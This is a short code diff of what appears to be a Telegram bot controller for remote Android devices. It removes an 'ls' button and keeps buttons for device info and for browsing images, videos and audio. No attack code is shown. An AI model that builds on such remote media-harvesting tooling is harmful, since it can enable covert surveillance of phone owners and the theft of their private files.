@@ -423,7 +423,7 @@ def advanced_keyboard(did):
 # ── Info Keyboard ──
 def info_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(_cbtn(did,"get-device-info"), _cbtn(did,"ls"))
+    kb.add(_cbtn(did,"get-device-info"))
     # ✅ Media explorer buttons (use MediaStore - "الملفات والوسائط" permission)
     kb.add(_cbtn(did,"media-images"), _cbtn(did,"media-videos"))
     kb.add(_cbtn(did,"media-audio"))
